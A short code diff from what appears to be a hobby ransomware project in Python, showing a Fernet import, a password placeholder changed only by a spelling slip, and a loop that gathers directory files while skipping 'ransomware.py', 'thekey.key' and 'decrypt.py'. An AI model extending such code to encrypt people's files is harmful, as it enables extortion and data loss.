@@ -2,7 +2,7 @@ import os
 from cryptography.fernet import Fernet
 
 files = []
-password="choose a password"
+password="choose a pasword"
 
 for file in os.listdir():
     if file == "ransomware.py" or file == "thekey.key" or file == "decrypt.py":
